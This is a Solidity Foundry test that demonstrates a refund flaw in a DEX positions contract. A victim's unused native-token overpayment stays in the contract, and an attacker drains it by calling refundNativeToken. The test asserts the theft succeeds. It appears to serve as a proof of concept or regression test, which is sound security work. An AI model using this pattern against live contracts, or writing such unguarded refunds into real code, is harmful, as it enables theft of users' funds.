// SPDX-License-Identifier: ekubo-license-v1.eth
pragma solidity >=0.8.30;

import {FullTest} from "./FullTest.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {createConcentratedPoolConfig} from "../src/types/poolConfig.sol";
import {NATIVE_TOKEN_ADDRESS, MAX_TICK} from "../src/math/constants.sol";

contract RefundNativeTokenTest is FullTest {
    uint64 constant FEE = 1e6; // arbitrary fee for the pool
    uint32 constant TICK_SPACING = 60;

    function test_attackerStealsVictimOverpayment() public {
        PoolKey memory poolKey = createPool(
            NATIVE_TOKEN_ADDRESS,
            address(token1),
            MAX_TICK - int32(TICK_SPACING),
            createConcentratedPoolConfig(FEE, TICK_SPACING, address(0))
        );

        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");

        token1.transfer(victim, 1 ether);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        vm.startPrank(victim);
        token1.approve(address(positions), type(uint256).max);
        (, uint128 liquidity, uint128 usedAmount0, uint128 usedAmount1) = positions.mintAndDeposit{value: 5 ether}(
            poolKey,
            -int32(TICK_SPACING * 2),
            -int32(TICK_SPACING),
            0,
            1 ether,
            0
        );
        vm.stopPrank();

        assertGt(liquidity, 0, "liquidity must be provided");
        assertEq(usedAmount0, 0, "deposit consumed no native token");
        assertGt(usedAmount1, 0, "token1 provided liquidity");
        assertEq(address(positions).balance, 5 ether, "leftover native token trapped");

        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        positions.refundNativeToken();

        assertEq(attacker.balance, attackerBefore + 5 ether, "attacker stole the victim's refund");
        assertEq(address(positions).balance, 0, "contract balance drained");
    }
}
